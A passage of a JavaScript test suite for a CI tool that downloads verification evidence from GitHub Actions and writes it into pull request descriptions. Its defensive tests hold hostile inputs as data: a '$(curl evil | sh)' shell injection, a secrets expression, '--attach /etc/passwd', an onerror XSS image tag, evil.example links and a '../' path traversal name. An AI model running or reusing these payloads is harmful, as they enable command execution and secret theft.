    assert.equal(withEvidenceBlock(`intro\n\n${OLDER_BLOCK}\n`, 'ios', block).body, `intro\n\n${block}\n`);
  });

  it('goes after a description that has no block, and leaves that description as it was', () => {
    for (const body of ['## Summary\r\n\r\nFixes the button.  \r\n', 'no newline at the end', 'ends with one\n']) {
      const edit = withEvidenceBlock(body, 'ios', block);
      assert.ok(edit.ok && edit.was === 'added');
      assert.ok(edit.body.startsWith(body), JSON.stringify(body));
      assert.match(edit.body.slice(body.length), /^(\n{1,2}|(\r\n){1,2})<!-- verify-evidence:ios -->/);
      assert.ok(edit.body.replaceAll('\r\n', '\n').endsWith(block));
    }
    assert.deepEqual(withEvidenceBlock('', 'ios', block), { ok: true, body: block, was: 'added', old: null });
  });

  it('replaces the block that is there and keeps every byte before and after it', () => {
    const before = '## Summary\r\n\r\nText above.  \n\n';
    const after = '\n\n- [x] a checklist\r\n<!-- /verify-evidence:android -->\ttrailing\n';
    const old = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    const edit = withEvidenceBlock(`${before}${old}${after}`, 'ios', block);
    assert.equal(edit.body, `${before}${block.replaceAll('\n', '\r\n')}${after}`);
    assert.equal(edit.was, 'replaced');
    assert.equal(edit.body.includes('r20261007-010101-aaaa'), false);
  });

  it('keeps the block of the other platform', () => {
    const android = blockOf(manifestFor(MEDIA, { platform: 'android', device: 'Pixel 9' }));
    assert.equal(withEvidenceBlock(`intro\n\n${android}\n`, 'ios', block).body, `intro\n\n${android}\n\n${block}`);
  });

  it('takes a marker only when it is a whole line, so a description may quote one', () => {
    const { start, end } = evidenceMarkers('ios');
    const quoting = `The block sits between \`${start}\` and \`${end}\`.\n\n    ${start}\n    indented, so not a marker\n    ${end}\n`;
    const edit = withEvidenceBlock(quoting, 'ios', block);
    assert.equal(edit.was, 'added');
    assert.equal(edit.body, `${quoting}\n${block}`);
  });

  it('writes the block with the line endings of the description, added or replaced', () => {
    const crlf = block.replaceAll('\n', '\r\n');
    const old = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' })).replaceAll('\n', '\r\n');
    assert.equal(withEvidenceBlock(`intro\r\n\r\n${old}\r\noutro`, 'ios', block).body, `intro\r\n\r\n${crlf}\r\noutro`);
    assert.equal(withEvidenceBlock('intro\r\n', 'ios', block).body, `intro\r\n\r\n${crlf}`);
    assert.equal(withEvidenceBlock('one\r\ntwo', 'ios', block).body, `one\r\ntwo\r\n\r\n${crlf}`);
    assert.equal(
      withEvidenceBlock(`intro\n\n${old.replaceAll('\r\n', '\n')}\n`, 'ios', block).body,
      `intro\n\n${block}\n`,
    );
    for (const body of [`intro\r\n\r\n${old}\r\noutro`, 'intro\r\n']) {
      assert.equal(/[^\r]\n/.test(withEvidenceBlock(body, 'ios', block).body), false, 'no bare line feed');
    }
  });

  it('refuses to replace text between two markers that is not a block it wrote', () => {
    const { start, end } = evidenceMarkers('ios');
    const notes = `${start}\nIMPORTANT reviewer notes that are not evidence\n${end}\n`;
    assert.deepEqual(withEvidenceBlock(notes, 'ios', block), {
      ok: false,
      why: 'has text between the markers that is not an evidence block',
    });
  });

  it('takes no marker from inside a code fence, so a description may show a whole example block', () => {
    const example = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    for (const [open, close] of [
      ['```', '```'],
      ['```markdown', '```'],
      ['~~~~', '~~~~~'],
      ['   ```', '```  '],
      ['```\n```not the end, it has text after the ticks', '```'],
      ['```\n~~~', '```'],
      ['````\n```', '````'],
    ]) {
      const documented = `The block looks like this:\n\n${open}\n${example}\n${close}\n`;
      const added = withEvidenceBlock(documented, 'ios', block);
      assert.equal(added.was, 'added', open);
      assert.equal(added.body, `${documented}\n${block}`);
      const replaced = withEvidenceBlock(
        added.body,
        'ios',
        blockOf(manifestFor(MEDIA, { run: 'r20261009-020202-bbbb' })),
      );
      assert.equal(replaced.was, 'replaced', open);
      assert.ok(replaced.body.startsWith(documented) && replaced.body.includes('r20261009-020202-bbbb'));
      assert.equal(replaced.body.includes('r20261008-052713-253e'), false);
    }
  });

  it('still takes a marker after a fence that closed, and one beside a line that only looks like a fence', () => {
    const real = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    for (const before of [
      '```\ncode\n```\n\n',
      'Use ```three ticks``` inline.\n\n',
      '```three ticks``` that open a line are inline code too.\n\n',
      '    ```\n\n',
      '``\n\n',
    ]) {
      const edit = withEvidenceBlock(`${before}${real}\n`, 'ios', block);
      assert.equal(edit.was, 'replaced', JSON.stringify(before));
      assert.equal(edit.body, `${before}${block}\n`);
    }
  });

  it('opens no fence at a fence line inside an HTML comment, so the next run finds the block it wrote', () => {
    for (const hidden of [
      '<!--\n```\n-->\n\nintro\n',
      '<!-- a note\r\n~~~\r\nstill the note -->\r\n',
      'intro\n   <!--\n```\n',
    ]) {
      const added = withEvidenceBlock(hidden, 'ios', block);
      assert.equal(added.was, 'added', JSON.stringify(hidden));
      const again = withEvidenceBlock(added.body, 'ios', blockOf(manifestFor(MEDIA, { run: 'r20261009-020202-bbbb' })));
      assert.equal(again.was, 'replaced', JSON.stringify(hidden));
      assert.equal(again.body.split('<!-- verify-evidence:ios -->').length, 2, 'one block, not two');
      assert.ok(again.body.startsWith(hidden));
    }
    const fencedComment = '```\n<!--\n```\n\n';
    assert.equal(withEvidenceBlock(`${fencedComment}${block}\n`, 'ios', block).was, 'replaced');
  });

  it('refuses a description that ends inside a code fence that never closes, where a block would be code and never found again', () => {
    for (const unclosed of ['intro\n\n```\ncode\n', 'intro\r\n~~~~ js\r\ncode', '```']) {
      assert.deepEqual(
        withEvidenceBlock(unclosed, 'ios', block),
        { ok: false, why: 'ends inside a code fence that is never closed' },
        JSON.stringify(unclosed),
      );
    }
    const earlier = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    assert.equal(
      withEvidenceBlock(`intro\n\n${earlier}\n\n~~~\ncode\n`, 'ios', block).body,
      `intro\n\n${block}\n\n~~~\ncode\n`,
      'a block before the open fence is still replaced',
    );
  });

  it('refuses a description whose markers are doubled, halved, or out of order, and says which', () => {
    const { start, end } = evidenceMarkers('ios');
    assert.deepEqual(withEvidenceBlock(`${block}\n\n${block}`, 'ios', block), {
      ok: false,
      why: 'has the start marker 2 times and the end marker 2 times',
    });
    assert.deepEqual(withEvidenceBlock(`text\n${start}\nno end`, 'ios', block), {
      ok: false,
      why: 'has the start marker 1 times and the end marker 0 times',
    });
    assert.deepEqual(withEvidenceBlock(`no start\n${end}\n`, 'ios', block), {
      ok: false,
      why: 'has the start marker 0 times and the end marker 1 times',
    });
    assert.deepEqual(withEvidenceBlock(`${end}\n${start}`, 'ios', block), {
      ok: false,
      why: 'has the end marker before the start marker',
    });
  });
});

function workDir() {
  return path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'verify-attach-test-')), 'work');
}

const ENV = {
  REPO,
  RUN_ID: '37731397352',
  RUN_EVENT: 'workflow_dispatch',
  RUN_PATH: '.github/workflows/verify-remote.yml',
  RUN_HEAD_REPO: REPO,
  HEAD_BRANCH: 'feature/change',
  HEAD_SHA: COMMIT,
  RUN_ACTOR: 'octocat',
};
const beforeIsInTheHistory = () => Promise.resolve(Response.json({ status: 'ahead' }));

describe('the step that fetches the evidence', () => {
  const artifact = (id, change = {}) => ({
    id,
    name: 'verify-evidence',
    size_in_bytes: 100,
    expired: false,
    ...change,
  });
  function github(artifacts, zipBytes = bundle()) {
    const calls = [];
    const fetch = (url, init) => {
      calls.push({ url, authorization: init.headers.Authorization });
      return Promise.resolve(url.includes('/artifacts?') ? Response.json({ artifacts }) : new Response(zipBytes));
    };
    return { fetch, calls };
  }
  const download = hub =>
    downloadArtifact({
      fetch: hub.fetch,
      api: 'https://api.github.test',
      token: 'actions-token',
      repo: REPO,
      runId: '37731397352',
    });

  it('downloads the newest verify-evidence artifact of the run, and no other artifact', async () => {
    const hub = github([
      artifact(5),
      artifact(9),
      artifact(7, { expired: true }),
      artifact(11, { name: 'verify-evidence-logs' }),
    ]);
    assert.deepEqual(await download(hub), bundle());
    assert.deepEqual(
      hub.calls.map(call => call.url),
      [
        'https://api.github.test/repos/clerk/clerk-ios/actions/runs/37731397352/artifacts?name=verify-evidence&per_page=100',
        'https://api.github.test/repos/clerk/clerk-ios/actions/artifacts/9/zip',
      ],
    );
    assert.deepEqual(
      hub.calls.map(call => call.authorization),
      ['Bearer actions-token', 'Bearer actions-token'],
    );
  });

  it('finds nothing when the run kept no evidence', async () => {
    assert.equal(await download(github([])), null);
    assert.equal(await download(github([artifact(1, { expired: true })])), null);
  });

  it('refuses an artifact over the size cap by its listed size, and again while it downloads', async () => {
    const listedTooBig = github([artifact(1, { size_in_bytes: LIMITS.zipBytes + 1 })]);
    await assert.rejects(download(listedTooBig), Refused);
    assert.equal(listedTooBig.calls.length, 1, 'nothing was downloaded');
    const piece = Buffer.alloc(16 * 1024 * 1024);
    let pieces = 0;
    const pastTheCap = new ReadableStream({
      pull: controller => ((pieces += 1) <= 11 ? controller.enqueue(piece) : controller.close()),
    });
    await assert.rejects(download(github([artifact(1)], pastTheCap)), Refused);
    assert.ok(pieces <= 12, 'it stopped reading at the piece that passed the cap');
  });

  it('writes the validated files under WORK by the names it validated, and reports found', async () => {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle());
    const said = [];
    assert.equal(
      await fetchStep({ env: { ...ENV, WORK: work }, say: (kind, text) => said.push(`${kind}: ${text}`), zipFile }),
      true,
    );
    assert.deepEqual(fs.readdirSync(work).sort(), ['files', 'manifest.json']);
    assert.deepEqual(fs.readdirSync(path.join(work, 'files')).sort(), ['profile.png', 'video.mp4']);
    assert.deepEqual(fs.readFileSync(path.join(work, 'files', 'video.mp4')), MP4);
    const withBefore = workDir();
    fs.writeFileSync(zipFile, bundle(WITH_BEFORE, [...MEDIA, ...WAS_MEDIA]));
    await fetchStep({ env: { ...ENV, WORK: withBefore }, say: () => undefined, fetch: beforeIsInTheHistory, zipFile });
    assert.deepEqual(fs.readdirSync(path.join(withBefore, 'files')).sort(), [
      'before-profile.png',
      'before-video.mp4',
      'profile.png',
      'video.mp4',
    ]);
    assert.deepEqual(fs.readFileSync(path.join(withBefore, 'files', 'before-profile.png')), WAS_PNG);
    assert.deepEqual(said, [
      'notice: Run 37731397352 handed off the evidence of verify run r20261008-052713-253e for pull request #669: 2 files.',
    ]);
  });

  it('takes a before run only when GitHub says its commit is the commit of the run or one before it in its history', async () => {
    const zipFile = path.join(path.dirname(workDir()), 'evidence.zip');
    const attempt = async (answer, media = [...MEDIA, ...WAS_MEDIA], manifest = WITH_BEFORE) => {
      fs.writeFileSync(zipFile, bundle(manifest, media));
      const work = workDir();
      const asked = [];
      const fetch = (url, init) => {
        asked.push(`${init.headers.Authorization} ${url}`);
        return Promise.resolve(answer());
      };
      const env = { ...ENV, WORK: work, GITHUB_TOKEN: 'actions-token', GITHUB_API_URL: 'https://api.github.test/' };
      const outcome = await fetchStep({ env, say: () => undefined, fetch, zipFile }).then(
        found => `found ${found}`,
        error => `${error instanceof Refused ? 'refused' : 'failed'}: ${error.message}`,
      );
      return { outcome, asked, wrote: fs.existsSync(work) };
    };
    const compared = status => () => Response.json({ status });
    const comparison =
      'Bearer actions-token https://api.github.test/repos/clerk/clerk-ios/compare/5e126375065188df5bec4e4e75d61db03834f395...0f50b597b1c2d3e4f5a60718293a4b5c6d7e8f90?per_page=1';

    assert.deepEqual(await attempt(compared('ahead')), { outcome: 'found true', asked: [comparison], wrote: true });
    assert.deepEqual(await attempt(compared('identical')), { outcome: 'found true', asked: [comparison], wrote: true });
    const outside = 'refused: the commit of before is not the commit of the run or a commit before it in its history';
    for (const answer of [compared('behind'), compared('diverged'), compared(undefined), () => Response.json(null)]) {
      assert.deepEqual(await attempt(answer), { outcome: outside, asked: [comparison], wrote: false });
    }
    assert.deepEqual(await attempt(() => Response.json({ message: 'Not Found' }, { status: 404 })), {
      outcome: 'refused: the commit of before, or the commit of the run, is not a commit of this repository',
      asked: [comparison],
      wrote: false,
    });
    assert.deepEqual(await attempt(() => Response.json({ status: 'ahead' }, { status: 502 })), {
      outcome: 'failed: GitHub answered 502 to the comparison of the commit of before with the commit of the run',
      asked: [comparison],
      wrote: false,
    });
    assert.deepEqual(await attempt(compared('behind'), MEDIA, GOOD), { outcome: 'found true', asked: [], wrote: true });
  });

  it('writes only into a directory that is new or empty', async () => {
    const work = workDir();
    fs.mkdirSync(work);
    fs.writeFileSync(path.join(work, 'left-by-something-else'), 'x');
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle());
    await assert.rejects(
      fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, zipFile }),
      /WORK must be a new or empty directory/,
    );
    assert.deepEqual(fs.readdirSync(work), ['left-by-something-else']);
  });

  it('writes nothing for an archive it refuses', async () => {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle(GOOD, MEDIA, [{ name: '../escaped.png', data: PNG }]));
    await assert.rejects(fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, zipFile }), Refused);
    assert.deepEqual(fs.readdirSync(path.dirname(work)), ['evidence.zip']);
  });

  it('reads no artifact of a run that is not a dispatched session of this repository', async () => {
    const hub = github([artifact(1)]);
    const said = [];
    for (const change of [
      { RUN_EVENT: 'pull_request' },
      { RUN_PATH: '.github/workflows/ci.yml' },
      { RUN_HEAD_REPO: 'someone/clerk-ios' },
    ]) {
      assert.equal(
        await fetchStep({
          env: { ...ENV, ...change, WORK: workDir() },
          say: (_kind, text) => said.push(text),
          fetch: hub.fetch,
        }),
        false,
      );
    }
    assert.deepEqual(hub.calls, []);
    assert.equal(said.length, 3);
  });
});

describe('the step that edits the description', () => {
  const BASE = 'ba5e'.repeat(10);
  const PULL = {
    state: 'open',
    body: '## Summary\r\n\r\nFixes the button.\r\n',
    head: { ref: 'feature/change', sha: COMMIT, repo: { full_name: REPO } },
    base: { sha: BASE, repo: { full_name: REPO } },
  };

  async function fetched(manifest = GOOD, media = MEDIA) {
    const work = workDir();
    const zipFile = path.join(path.dirname(work), 'evidence.zip');
    fs.writeFileSync(zipFile, bundle(manifest, media));
    await fetchStep({ env: { ...ENV, WORK: work }, say: () => undefined, fetch: beforeIsInTheHistory, zipFile });
    return { ...ENV, WORK: work };
  }

  const asset = n =>
    `https://github.com/user-attachments/assets/00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;

  function fakeGh(pull = PULL, onRead = () => undefined, commits = COMMITS, compared = '{"status":"diverged"}') {
    const state = {
      pull: structuredClone(pull),
      reads: 0,
      calls: [],
      writtenBody: null,
      laidOutBody: null,
      uploads: 0,
    };
    const gh = (args, options) => {
      state.calls.push({ args, cwd: options.cwd });
      const page = /\/commits\?per_page=100&page=(\d+)$/.exec(args[1] ?? '');
      if (args[0] === 'api' && page !== null) {
        const from = (Number(page[1]) - 1) * 100;
        fs.writeFileSync(options.stdoutFile, JSON.stringify(commits.slice(from, from + 100)));
        return { status: 0, stderr: '' };
      }
      if (args[0] === 'api' && /\/compare\//.test(args[1] ?? '')) {
        fs.writeFileSync(options.stdoutFile, compared);
        return { status: 0, stderr: '' };
      }
      if (args[0] === 'api') {
        state.reads += 1;
        onRead(state);
        fs.writeFileSync(options.stdoutFile, JSON.stringify(state.pull));
        return { status: 0, stderr: '' };
      }
      const body = fs.readFileSync(args[args.indexOf('--body-file') + 1], 'utf8');
      state[state.writtenBody === null ? 'writtenBody' : 'laidOutBody'] = body;
      state.pull.body = body.replace(/!\[([^\]]*)\]\(\.\/([^)]+)\)/g, (_, alt, file) => {
        state.uploads += 1;
        return file.endsWith('.mp4') ? asset(state.uploads) : `![${alt}](${asset(state.uploads)})`;
      });
      return { status: 0, stderr: '' };
    };
    return { gh, state };
  }

  const publish = (env, fake, options = {}) => {
    const said = [];
    const outcome = publishStep({
      env,
      say: (kind, text) => said.push(`${kind}: ${text}`),
      gh: fake.gh,
      nonce: () => 'n0nce',
      ...options,
    });
    return { outcome, said };
  };
  const onDisk = manifest => file => `evidence-n0nce-${manifest.files.indexOf(file) + 1}${path.extname(file.name)}`;
  const PLACED = blockOf(GOOD, onDisk(GOOD));
  const COMMITS = [{ sha: 'a'.repeat(40) }, { sha: COMMIT }];
  const SAID =
    '**Verified on an iOS simulator**, as reported by [the session](https://github.com/clerk/clerk-ios/actions/runs/37731397352) that `octocat` started. Run `r20261008-052713-253e` on `iPhone Air on xcode-27` at `0f50b597b1c2`, 3 of 3 passed.';
  const WAS =
    ' The session reports the before as run `r20261008-051500-0a1b` at [`5e1263750651`](https://github.com/clerk/clerk-ios/commit/5e126375065188df5bec4e4e75d61db03834f395), 0 of 3 passed.';
  const laidOut = (...lines) =>
    ['<!-- verify-evidence:ios -->', '', ...lines, '', '<!-- /verify-evidence:ios -->'].join('\n');
  const AFTER_ONLY = [
    '',
    '| `profile` |',
    '| :---: |',
    `| <img src="${asset(2)}" width="280" alt="profile"> |`,
    '',
    '| `video` |',
    '| :---: |',
    `| ${asset(1)} |`,
  ];

  it('adds the block after the description and attaches the files from their own directory, under names the description could not have guessed', async () => {
    const env = await fetched();
    const fake = fakeGh();
    const { outcome, said } = publish(env, fake);
    assert.equal(outcome, 'published');
    assert.deepEqual(
      fake.state.calls.map(call => call.args.slice(0, 2).join(' ')),
      [
        'api repos/clerk/clerk-ios/pulls/669',
        'api repos/clerk/clerk-ios/pulls/669/commits?per_page=100&page=1',
        'api repos/clerk/clerk-ios/pulls/669',
        'pr edit',
        'api repos/clerk/clerk-ios/pulls/669',
        'pr edit',
      ],
    );
    const edit = fake.state.calls[3];
    assert.deepEqual(edit.args, [
      'pr',
      'edit',
      '669',
      '--repo',
      REPO,
      '--body-file',
      path.join(env.WORK, 'body.md'),
      '--attach',
      './evidence-n0nce-1.mp4',
      '--attach',
      './evidence-n0nce-2.png',
    ]);
    assert.equal(edit.cwd, path.join(env.WORK, 'files'));
    assert.deepEqual(fs.readdirSync(edit.cwd).sort(), ['evidence-n0nce-1.mp4', 'evidence-n0nce-2.png']);
    assert.equal(fake.state.writtenBody, `${PULL.body}\r\n${PLACED.replaceAll('\n', '\r\n')}`);
    assert.ok(
      PLACED.includes('![video.mp4](./evidence-n0nce-1.mp4)') && PLACED.includes('![profile](./evidence-n0nce-2.png)'),
    );
    assert.deepEqual(fake.state.calls[5].args, edit.args.slice(0, 7));
    assert.equal(fake.state.calls[5].cwd, edit.cwd);
    assert.equal(fake.state.laidOutBody, `${PULL.body}\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}`);
    assert.deepEqual(said, [
      'notice: Put verify run r20261008-052713-253e in the description of pull request #669: 2 files.',
    ]);
  });

  it('replaces the block of an earlier run and keeps the text around it', async () => {
    const env = await fetched();
    const earlier = blockOf(manifestFor(MEDIA, { run: 'r20261007-010101-aaaa' }));
    const fake = fakeGh({ ...PULL, body: `intro\r\n\r\n${earlier}\r\n\r\noutro` });
    assert.equal(publish(env, fake).outcome, 'published');
    assert.equal(fake.state.writtenBody, `intro\r\n\r\n${PLACED.replaceAll('\n', '\r\n')}\r\n\r\noutro`);
    assert.equal(
      fake.state.laidOutBody,
      `intro\r\n\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}\r\n\r\noutro`,
    );
  });

  it('names no file the way a description can name one, so gh rewrites no reference outside the block', async () => {
    const attachedBy = async () => {
      const fake = fakeGh({
        ...PULL,
        body: 'Before: ![demo](./video.mp4) and [shot](./profile.png)\n\n[x]: ./video.mp4\n',
      });
      publishStep({ env: await fetched(), say: () => undefined, gh: fake.gh });
      return fake.state.calls[3].args.filter((_, i, args) => args[i - 1] === '--attach');
    };
    const first = await attachedBy();
    const second = await attachedBy();
    for (const name of [...first, ...second]) {
      assert.match(name, /^\.\/evidence-[0-9a-f]{16}-[12]\.(mp4|png)$/);
    }
    assert.notDeepEqual(first, second, 'the names differ from one publish to the next');
  });

  it('keeps the description out of every command line, even when it holds shell and workflow syntax', async () => {
    const env = await fetched();
    const hostile = '$(curl evil | sh) `id` ${{ secrets.VERIFY_EVIDENCE_TOKEN }}\n::add-mask::x\n--attach /etc/passwd';
    const fake = fakeGh({ ...PULL, body: hostile });
    const { said } = publish(env, fake);
    for (const call of fake.state.calls) {
      for (const arg of call.args) {
        assert.equal(arg.includes('evil') || arg.includes('passwd'), false, arg);
      }
    }
    assert.ok(fake.state.writtenBody.startsWith(`${hostile}\n\n<!-- verify-evidence:ios -->`));
    assert.equal(said.join('\n').includes('evil'), false);
  });

  it('prints the command and runs nothing in a dry run', async () => {
    const env = await fetched();
    const pullFile = path.join(path.dirname(env.WORK), 'pull.json');
    const commitsFile = path.join(path.dirname(env.WORK), 'commits.json');
    fs.writeFileSync(pullFile, JSON.stringify(PULL));
    fs.writeFileSync(commitsFile, JSON.stringify(COMMITS));
    const fake = fakeGh();
    const { outcome, said } = publish(env, fake, { dryRun: true, pullFile, commitsFile });
    assert.equal(outcome, 'dry run');
    assert.deepEqual(fake.state.calls, []);
    assert.deepEqual(said, [
      `plain: would run, in ${path.join(env.WORK, 'files')}:\ngh pr edit 669 --repo clerk/clerk-ios --body-file ${path.join(env.WORK, 'body.md')} --attach ./evidence-n0nce-1.mp4 --attach ./evidence-n0nce-2.png`,
    ]);
    assert.equal(
      fs.readFileSync(path.join(env.WORK, 'body.md'), 'utf8'),
      `${PULL.body}\r\n${PLACED.replaceAll('\n', '\r\n')}`,
    );
  });

  it('reads the comparison with the base branch from a file in a dry run that names one', async () => {
    const dry = async status => {
      const env = { ...(await fetched()), HEAD_SHA: 'd'.repeat(40) };
      const file = name => path.join(path.dirname(env.WORK), name);
      fs.writeFileSync(file('pull.json'), JSON.stringify(PULL));
      fs.writeFileSync(file('commits.json'), JSON.stringify([{ sha: COMMIT }]));
      fs.writeFileSync(file('compare.json'), JSON.stringify({ status }));
      const lines = [];
      const files = ['--pull', file('pull.json'), '--commits', file('commits.json'), '--compare', file('compare.json')];
      assert.equal(await main(['publish', '--dry-run', ...files], env, line => lines.push(line)), 0);
      return lines.map(line => line.replace(/-[0-9a-f]{16}-/g, '-<nonce>-').replaceAll(env.WORK, '<work>'));
    };
    assert.deepEqual(await dry('ahead'), [
      'would run, in <work>/files:\ngh pr edit 669 --repo clerk/clerk-ios --body-file <work>/body.md --attach ./evidence-<nonce>-1.mp4 --attach ./evidence-<nonce>-2.png',
    ]);
    assert.deepEqual(await dry('diverged'), [
      '::notice title=verify-attach::Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not one of its commits or a commit of its base branch), so nothing is published.',
    ]);
  });

  it('prints the usage and compares nothing when --compare names no file', async () => {
    const env = await fetched();
    const file = name => path.join(path.dirname(env.WORK), name);
    fs.writeFileSync(file('pull.json'), JSON.stringify(PULL));
    fs.writeFileSync(file('commits.json'), JSON.stringify(COMMITS));
    const lines = [];
    const files = ['--pull', file('pull.json'), '--commits', file('commits.json'), '--compare'];
    assert.equal(await main(['publish', '--dry-run', ...files], env, line => lines.push(line)), 2);
    assert.deepEqual(lines, [
      'usage: verify-attach.mjs fetch [--zip <file>] | publish [--dry-run] [--pull <file> --commits <file> [--compare <file>]]',
    ]);
  });

  const SHOT = [['profile.png', PNG]];
  const WAS_SHOT = [['before-profile.png', WAS_PNG]];
  const CLIP = [['video.mp4', MP4]];
  const WAS_CLIP = [['before-video.mp4', WAS_MP4]];
  const published = async (media, wasMedia) => {
    const manifest = manifestFor(media, wasMedia === undefined ? {} : { before: beforeFor(wasMedia) });
    const fake = fakeGh({ ...PULL, body: '' });
    const { outcome } = publish(await fetched(manifest, [...media, ...(wasMedia ?? [])]), fake);
    assert.equal(outcome, 'published');
    return fake.state.pull.body;
  };

  it('lays out a still change to something that exists as before and after screenshots, side by side at a fixed width', async () => {
    assert.equal(
      await published(SHOT, WAS_SHOT),
      laidOut(
        `${SAID}${WAS}`,
        '',
        '| Before | After |',
        '| :---: | :---: |',
        `| <img src="${asset(2)}" width="280" alt="Before: profile"> | <img src="${asset(1)}" width="280" alt="After: profile"> |`,
      ),
    );
  });

  it('lays out a still change that is new as its screenshots alone, two across under their names', async () => {
    assert.equal(
      await published([
        ['start.png', PNG],
        ['profile.jpg', JPG],
        ['security.png', PNG],
      ]),
      laidOut(
        SAID,
        '',
        '| `start` | `profile` |',
        '| :---: | :---: |',
        `| <img src="${asset(1)}" width="280" alt="start"> | <img src="${asset(2)}" width="280" alt="profile"> |`,
        '',
        '| `security` |',
        '| :---: |',
        `| <img src="${asset(3)}" width="280" alt="security"> |`,
      ),
    );
  });

  it('lays out a change to a flow that exists as the before and after videos, side by side', async () => {
    assert.equal(
      await published(CLIP, WAS_CLIP),
      laidOut(`${SAID}${WAS}`, '', '| Before | After |', '| :---: | :---: |', `| ${asset(2)} | ${asset(1)} |`),
    );
  });

  it('lays out a flow that is new as its video alone, in a table that keeps it from the full width', async () => {
    assert.equal(await published(CLIP), laidOut(SAID, '', '| `video` |', '| :---: |', `| ${asset(1)} |`));
  });

  it('lays out both kinds when the hand-off holds both: the screenshots first, then the video, each as it is alone', async () => {
    assert.equal(
      await published([...CLIP, ...SHOT], [...WAS_CLIP, ...WAS_SHOT]),
      laidOut(
        `${SAID}${WAS}`,
        '',
        '| Before | After |',
        '| :---: | :---: |',
        `| <img src="${asset(4)}" width="280" alt="Before: profile"> | <img src="${asset(2)}" width="280" alt="After: profile"> |`,
        '',
        '| Before | After |',
        '| :---: | :---: |',
        `| ${asset(3)} | ${asset(1)} |`,
      ),
    );
    assert.equal(await published([...CLIP, ...SHOT]), laidOut(SAID, ...AFTER_ONLY));
  });

  const ASCII = Array.from({ length: 128 }, (_, code) => String.fromCharCode(code));
  const ADDRESS = 'https://github\\.com/user-attachments/assets/[0-9a-f-]{36}';
  const LABEL = '[A-Za-z0-9._-]+';
  const COUNTS = '\\d+ of \\d+ passed(, \\d+ flaky \\(passed only on a retry\\))?';
  const CELL = `(${ADDRESS}|<img src="${ADDRESS}" width="280" alt="((Before|After): )?${LABEL}">)`;
  const TEMPLATE = [
    /^$/,
    /^<!-- \/?verify-evidence:ios -->$/,
    new RegExp(
      `^\\*\\*Verified on an iOS simulator\\*\\*, as reported by \\[the session\\]\\(https://github\\.com/clerk/clerk-ios/actions/runs/\\d+\\) that \`[A-Za-z0-9_-]+\` started\\. Run \`r[0-9a-f-]+\` on \`[A-Za-z0-9 ._()-]+\` at \`[0-9a-f]{12}\`, ${COUNTS}\\.( The session reports the before as run \`r[0-9a-f-]+\` at \\[\`[0-9a-f]{12}\`\\]\\(https://github\\.com/clerk/clerk-ios/commit/[0-9a-f]{40}\\), ${COUNTS}\\.)?$`,
    ),
    new RegExp(`^\\| (Before \\| After|\`${LABEL}\`( \\| \`${LABEL}\`)?) \\|$`),
    /^\| :---: (\| :---: )?\|$/,
    new RegExp(`^\\| ${CELL}( \\| ${CELL})? \\|$`),
  ];
  const outsideTheTemplate = body => body.split('\n').filter(line => !TEMPLATE.some(pattern => pattern.test(line)));
  const publishedWith = async (manifest, media) => {
    let env;
    try {
      env = await fetched(manifest, media);
    } catch (error) {
      if (error instanceof Refused) {
        return null;
      }
      throw error;
    }
    const fake = fakeGh({ ...PULL, body: '' });
    assert.equal(publish(env, fake).outcome, 'published');
    return fake.state.pull.body;
  };

  it('writes nothing but its template around a file name, and takes in a name only letters, digits, a dot, an underscore and a dash', async () => {
    const taken = [];
    for (const char of ASCII) {
      const media = [
        [`a${char}b.png`, PNG],
        [`c${char}d.mp4`, MP4],
      ];
      const wasMedia = media.map(([name, data]) => [`before-${name}`, data]);
      const alone = await publishedWith(manifestFor(media), media);
      const paired = await publishedWith(manifestFor(media, { before: beforeFor(wasMedia) }), [...media, ...wasMedia]);
      assert.equal(alone === null, paired === null, JSON.stringify(char));
      if (alone !== null) {
        taken.push(char);
        assert.deepEqual(outsideTheTemplate(alone), [], JSON.stringify(char));
        assert.deepEqual(outsideTheTemplate(paired), [], JSON.stringify(char));
        assert.ok(
          alone.includes(`| \`a${char}b\` |`) && paired.includes(`alt="Before: a${char}b">`),
          JSON.stringify(char),
        );
      }
    }
    assert.equal(taken.join(''), '-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz');
  });

  it('writes nothing but its template around a device, and takes in a device only letters, digits, a space, a dot, an underscore, parentheses and a dash', async () => {
    const taken = [];
    for (const char of ASCII) {
      const body = await publishedWith(manifestFor(MEDIA, { device: `a${char}b` }), MEDIA);
      if (body !== null) {
        taken.push(char);
        assert.deepEqual(outsideTheTemplate(body), [], JSON.stringify(char));
        assert.ok(body.includes(` on \`a${char}b\` at `), JSON.stringify(char));
      }
    }
    assert.equal(taken.join(''), ' ()-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz');
  });

  it('counts as outside its template a line that markup in a name or a device would make', () => {
    const made = [
      '| `a|b` |',
      '| a |',
      '| www.evil.example |',
      '| <img src="https://github.com/user-attachments/assets/00000000-0000-4000-8000-000000000001" width="280" alt="a" onerror="alert(1)"> |',
      '| <img src="https://evil.example/user-attachments/assets/00000000-0000-4000-8000-000000000001" width="280" alt="a"> |',
      SAID.replace('`iPhone Air on xcode-27`', '`iPhone` [approved](https://evil.example) `Air`'),
      '<!-- /verify-evidence:ios --> text after the marker',
    ];
    assert.deepEqual(outsideTheTemplate(made.join('\n')), made);
    assert.deepEqual(outsideTheTemplate(laidOut(`${SAID}${WAS}`, ...AFTER_ONLY)), []);
  });

  it('attaches the files of the before run after the files of the run, under the same unguessable names, though the commit of the before run is no commit of the pull request', async () => {
